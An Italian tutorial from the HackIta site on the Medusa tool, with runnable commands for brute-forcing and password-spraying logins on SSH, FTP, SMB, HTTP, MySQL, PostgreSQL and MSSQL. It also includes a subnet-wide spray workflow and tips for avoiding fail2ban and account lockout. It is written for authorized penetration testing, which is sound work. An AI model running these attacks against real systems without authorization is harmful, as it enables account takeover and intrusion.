---
title: 'Medusa: High-Speed Login Brute-Force Tool per Servizi di Rete'
slug: medusa
description: 'Medusa è un tool parallelo per brute-force di autenticazioni su SSH, FTP, SMB, HTTP e altri servizi. Veloce, modulare e ideale per password auditing autorizzato.'
image: /Gemini_Generated_Image_ww9l6zww9l6zww9l.webp
draft: true
date: 2026-02-17T00:00:00.000Z
categories:
  - tools
subcategories:
  - expoit
tags:
  - bruteforce
---

Medusa è un bruteforcer veloce e modulare progettato per attacchi su larga scala. A differenza di Hydra, Medusa eccelle nella stabilità durante attacchi prolungati e nella gestione di grandi liste di target. In questa guida impari a configurare attacchi paralleli contro SSH, FTP, SMB e servizi web, sfruttando al massimo le capacità di threading del tool.

## Perché Scegliere Medusa

Quando hai centinaia di host da testare o wordlist massicce, Medusa offre vantaggi concreti rispetto ad altri bruteforcer. La sua architettura modulare permette di aggiungere supporto per nuovi protocolli senza modificare il core, mentre il sistema di threading è ottimizzato per mantenere connessioni stabili anche sotto carico pesante.

Medusa gestisce nativamente il testing parallelo su multipli host, cosa che con Hydra richiede scripting esterno. Se il tuo scenario prevede spray attack su un'intera subnet o test prolungati che durano ore, Medusa è spesso la scelta migliore.

## Installazione e Setup

Su Kali Linux Medusa è già presente. Verifica l'installazione e assicurati di avere l'ultima versione:

```bash
medusa -V
sudo apt update && sudo apt install medusa -y
```

Per Debian e Ubuntu il pacchetto è disponibile nei repository standard. Se preferisci compilare da source per avere tutti i moduli disponibili:

```bash
git clone https://github.com/jmk-foofus/medusa.git
cd medusa
./configure
make && sudo make install
```

La compilazione da source è consigliata se ti servono moduli specifici come Oracle o PostgreSQL che potrebbero non essere inclusi nel pacchetto precompilato.

## Sintassi e Parametri Principali

La struttura base di un comando Medusa segue sempre lo stesso pattern: specifichi target, credenziali e modulo da utilizzare.

```bash
medusa -h target -u user -P wordlist.txt -M modulo
```

I parametri che userai più frequentemente sono questi:

| Parametro | Funzione                        |
| --------- | ------------------------------- |
| `-h`      | Host singolo                    |
| `-H`      | File con lista host             |
| `-u`      | Username singolo                |
| `-U`      | File con lista username         |
| `-p`      | Password singola                |
| `-P`      | File con lista password         |
| `-M`      | Modulo (ssh, ftp, http, smb...) |
| `-t`      | Thread per host                 |
| `-T`      | Thread totali                   |
| `-f`      | Stop al primo successo per host |
| `-F`      | Stop al primo successo globale  |
| `-n`      | Porta non standard              |
| `-O`      | File output risultati           |

## Attacchi SSH

SSH è probabilmente il target più comune per bruteforce. Medusa gestisce sia autenticazione password che keyboard-interactive senza configurazione aggiuntiva.

Per un attacco base contro un singolo host:

```bash
medusa -h 192.168.1.100 -u root -P /usr/share/wordlists/rockyou.txt -M ssh
```

Quando hai multiple credenziali da testare, puoi specificare sia lista utenti che password. Medusa testerà tutte le combinazioni:

```bash
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ssh -t 4
```

Il parametro `-t 4` limita a 4 thread per host, fondamentale per evitare di triggerare protezioni fail2ban o simili.

L'output di un attacco riuscito mostra chiaramente le credenziali trovate:

```
ACCOUNT FOUND: [ssh] Host: 192.168.1.100 User: admin Password: admin123 [SUCCESS]
```

## Attacchi su Multipli Host

La vera forza di Medusa emerge negli attacchi distribuiti su molti target. Invece di scriptare cicli [bash](https://hackita.it/articoli/bash), puoi passare direttamente un file con la lista:

```bash
medusa -H targets.txt -u administrator -P passwords.txt -M ssh -T 32
```

Con `-T 32` specifichi il numero totale di thread, che Medusa distribuirà intelligentemente tra tutti gli host. Questo approccio è molto più efficiente di lanciare istanze separate.

Per un password spray efficace dove testi poche password su molti utenti (minimizzando il rischio di lockout), la sintassi diventa:

```bash
medusa -H targets.txt -U users.txt -p "Summer2024!" -M ssh
```

## Attacchi FTP

Il modulo FTP funziona in modo analogo a SSH. Medusa supporta sia FTP standard che FTPS:

```bash
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ftp
```

Per testare accesso anonimo, usa semplicemente:

```bash
medusa -h 192.168.1.100 -u anonymous -p anonymous -M ftp
```

## Attacchi SMB

SMB è fondamentale per ambienti Windows. Medusa supporta autenticazione NTLM e può testare credenziali di dominio:

```bash
medusa -h 192.168.1.100 -u administrator -P passwords.txt -M smbnt
```

Per specificare un dominio Windows:

```bash
medusa -h 192.168.1.100 -u admin -P passwords.txt -M smbnt -m DOMAIN:CORP
```

Dopo aver trovato credenziali valide, puoi procedere con lateral movement usando [CrackMapExec](https://hackita.it/articoli/crackmapexec) o PsExec.

## Attacchi HTTP

Medusa supporta sia HTTP Basic Authentication che form-based login, anche se per quest'ultimo la configurazione richiede più attenzione.

Per Basic Auth:

```bash
medusa -h 192.168.1.100 -u admin -P passwords.txt -M http -m DIR:/admin
```

Il parametro `-m DIR:/admin` specifica il path protetto da autenticazione.

Per form HTTP POST la configurazione è più complessa e in questi casi spesso conviene usare [Hydra](https://hackita.it/articoli/hydra) o [Patator](https://hackita.it/articoli/patator) che hanno sintassi più intuitive per i form web.

## Attacchi Database

Medusa include moduli per i database più comuni. Per MySQL:

```bash
medusa -h 192.168.1.100 -u root -P passwords.txt -M mysql
```

Per PostgreSQL:

```bash
medusa -h 192.168.1.100 -u postgres -P passwords.txt -M postgres
```

Per Microsoft SQL Server:

```bash
medusa -h 192.168.1.100 -u sa -P passwords.txt -M mssql
```

Ricorda che molti database hanno protezioni contro bruteforce o rate limiting. Usa thread bassi (`-t 2`) per evitare blocchi.

## Ottimizzazione Performance

La gestione dei thread è cruciale per bilanciare velocità e affidabilità. Troppi thread causano timeout e connessioni rifiutate, troppo pochi rallentano l'attacco inutilmente.

Come regola generale:

* **SSH**: 4-8 thread per host (fail2ban è comune)
* **FTP**: 8-16 thread
* **HTTP**: 16-32 thread
* **SMB**: 4-8 thread (Windows può bloccare)
* **Database**: 2-4 thread

Per attacchi multi-host, il parametro `-T` controlla i thread totali. Con 100 host e `-T 50`, Medusa distribuirà circa 0.5 thread per host, garantendo stabilità.

## Gestione Output

Per analizzare i risultati di attacchi lunghi, salva sempre l'output su file:

```bash
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ssh -O results.txt
```

Il file conterrà solo gli account trovati, facilmente parsabile per automazione successiva.

Per verbose output durante l'esecuzione, aggiungi `-v` (livelli da 1 a 6):

```bash
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -v 4
```

## Scenario Pratico: Subnet Assessment

Immagina di dover testare credenziali default su un'intera subnet durante un penetration test. Ecco un workflow completo:

Prima identifica tutti gli host con SSH attivo usando [nmap](https://hackita.it/articoli/nmap):

```bash
nmap -p 22 --open 192.168.1.0/24 -oG - | grep "22/open" | cut -d " " -f 2 > ssh_hosts.txt
```

Poi esegui password spray con credenziali comuni:

```bash
medusa -H ssh_hosts.txt -U common_users.txt -p "Password1" -M ssh -T 20 -O found_creds.txt
```

Il file `common_users.txt` dovrebbe contenere utenti tipici come root, admin, administrator, user, guest.

## Confronto con Altri Tool

| Caratteristica            | Medusa | Hydra | Patator  |
| ------------------------- | ------ | ----- | -------- |
| Stabilità attacchi lunghi | Ottima | Buona | Buona    |
| Multi-host nativo         | Sì     | No    | Parziale |
| Velocità raw              | Media  | Alta  | Media    |
| Protocolli supportati     | 20+    | 50+   | 15+      |
| Facilità HTTP form        | Bassa  | Media | Alta     |
| Gestione CSRF             | No     | No    | Sì       |

Usa Medusa quando: hai molti host, attacchi lunghi, necessiti stabilità. Usa [Hydra](https://hackita.it/articoli/hydra) per attacchi singoli e veloci. Usa [Patator](https://hackita.it/articoli/patator) per form complessi con token dinamici.

## Troubleshooting

**Connessioni timeout frequenti**: riduci thread con `-t 2` e aumenta il timeout di connessione.

**"Too many connections"**: il target ha rate limiting. Riduci drasticamente i thread o aggiungi delay.

**Modulo non trovato**: verifica i moduli disponibili con `medusa -d`. Potresti dover ricompilare con dipendenze aggiuntive.

**Falsi negativi**: alcuni servizi hanno messaggi di errore non standard. Usa `-v 6` per vedere le response complete e verificare che Medusa interpreti correttamente successo/fallimento.

## FAQ

**Medusa è meglio di Hydra?**

Dipende dallo scenario. Medusa eccelle in attacchi distribuiti e prolungati, Hydra è più veloce per target singoli e supporta più protocolli.

**Come evito account lockout?**

Password spray (una password per molti utenti) invece di bruteforce tradizionale. Usa delay tra tentativi e thread bassi.

**Posso usare combo file user:pass?**

Medusa non supporta combo file nativamente. Usa Hydra con `-C` oppure genera liste separate da un combo file.

**È legale usare Medusa?**

Solo su sistemi con autorizzazione scritta. Per penetration test professionali, contatta [hackita.it/servizi](https://hackita.it/servizi).

***

*Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).*

**Risorse**: [Medusa GitHub](https://github.com/jmk-foofus/medusa) | [Foofus Medusa](http://foofus.net/goons/jmk/medusa/medusa.html)
